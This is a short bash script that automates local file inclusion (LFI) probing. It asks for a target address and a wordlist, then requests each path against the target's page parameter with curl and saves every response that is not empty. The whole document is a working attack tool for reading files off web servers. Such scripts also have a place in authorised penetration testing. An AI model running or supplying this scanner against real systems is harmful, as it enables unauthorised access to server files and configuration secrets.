#!/bin/bash

printf "IP to check for LFI\nPlease input address up to page= part\n"
read -p "IP: " ip
printf "Full path to list\n"
read -p "List: " list

clear

# Check for LFI
count=1
while read l; do
curl -L http://$ip$l >> $count.txt
# Check if LFI is successful by looking at md5
md5_default=d41d8cd98f00b204e9800998ecf8427e
md5=$(md5sum "$count.txt" | cut -d " " -f1)
if [[ $md5 != $md5_default ]]
then
printf "\n$l\n" >> $count.txt
else
rm $count.txt
fi
let "count=count+1"
done <$list
